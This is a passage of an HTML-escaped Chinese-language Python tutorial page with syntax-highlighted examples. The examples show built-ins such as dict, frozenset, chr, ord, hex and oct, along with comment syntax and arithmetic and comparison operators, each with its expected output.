&lt;h5 id=&#34;class-dict-kwarg&#34;&gt;&lt;a href=&#34;#class-dict-kwarg&#34; class=&#34;headerlink&#34; title=&#34;class dict(**kwarg)&#34;&gt;&lt;/a&gt;&lt;code&gt;class dict(**kwarg)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
class dict(**kwarg)
class dict(mapping, **kwarg)
class dict(iterable, **kwarg)
创建一个字典
&#39;&#39;&#39;&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; t&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;t&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;# 传入关键字&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;zip&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;one&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;two&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;three&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 映射函数方式来构造字典&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;one&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;two&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;three&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 可迭代对象方式来构造字典&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;class-frozenset-iterable&#34;&gt;&lt;a href=&#34;#class-frozenset-iterable&#34; class=&#34;headerlink&#34; title=&#34;class frozenset([iterable])&#34;&gt;&lt;/a&gt;&lt;code&gt;class frozenset([iterable])&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 返回一个冻结的集合，冻结后集合不能再添加或删除任何元素&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;frozenset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;chr-i&#34;&gt;&lt;a href=&#34;#chr-i&#34; class=&#34;headerlink&#34; title=&#34;chr(i)&#34;&gt;&lt;/a&gt;&lt;code&gt;chr(i)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 返回值是当前整数对应的 ASCII 字符&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#0&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#0&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;ord-c&#34;&gt;&lt;a href=&#34;#ord-c&#34; class=&#34;headerlink&#34; title=&#34;ord(c)&#34;&gt;&lt;/a&gt;&lt;code&gt;ord(c)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 返回对应的 ASCII 数值，或者 Unicode 数值&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#97&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;hex-x&#34;&gt;&lt;a href=&#34;#hex-x&#34; class=&#34;headerlink&#34; title=&#34;hex(x)&#34;&gt;&lt;/a&gt;&lt;code&gt;hex(x)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 将10进制整数转换成16进制，以字符串形式表示&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#0x14&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;oct-x&#34;&gt;&lt;a href=&#34;#oct-x&#34; class=&#34;headerlink&#34; title=&#34;oct(x)&#34;&gt;&lt;/a&gt;&lt;code&gt;oct(x)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 将一个整数转换成 8 进制字符串&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;oct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#0o12&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;注释-1&#34;&gt;&lt;a href=&#34;#注释-1&#34; class=&#34;headerlink&#34; title=&#34;注释&#34;&gt;&lt;/a&gt;注释&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 单行注释&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
多行注释
&#39;&#39;&#39;&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#34;&#34;&#34;
多行注释
&#34;&#34;&#34;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;运算符&#34;&gt;&lt;a href=&#34;#运算符&#34; class=&#34;headerlink&#34; title=&#34;运算符&#34;&gt;&lt;/a&gt;运算符&lt;/h2&gt;&lt;h3 id=&#34;算数运算符&#34;&gt;&lt;a href=&#34;#算数运算符&#34; class=&#34;headerlink&#34; title=&#34;算数运算符&#34;&gt;&lt;/a&gt;算数运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; b
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 7&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; b
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; b
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 12&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; b
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1.3333333333333333&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; b
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt; b  &lt;span class=&#34;token comment&#34;&gt;# 乘方&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 64&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; b  &lt;span class=&#34;token comment&#34;&gt;# 取整除&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
c 的值为： 7
c 的值为： 1
c 的值为： 12
c 的值为： 1.3333333333333333
c 的值为： 1
c 的值为： 64
c 的值为： 2
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;比较运算符&#34;&gt;&lt;a href=&#34;#比较运算符&#34; class=&#34;headerlink&#34; title=&#34;比较运算符&#34;&gt;&lt;/a&gt;比较运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 等于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 不等于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 不等于 b&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 不等于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 等于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 不等于 b&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 小于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 大于等于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 大于等于 b&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 大于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 小于等于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 大于 b&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 修改变量 a 和 b 的值&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 小于等于 b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 大于  b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 小于等于 b&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b &lt;span class=&#34;token operator&#34;&gt;&amp;gt;=&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;b 大于等于 a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;b 小于 a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# b 大于等于 a    &lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
a 不等于 b
a 不等于 b
a 大于等于 b
a 大于 b
a 小于等于 b
b 大于等于 a
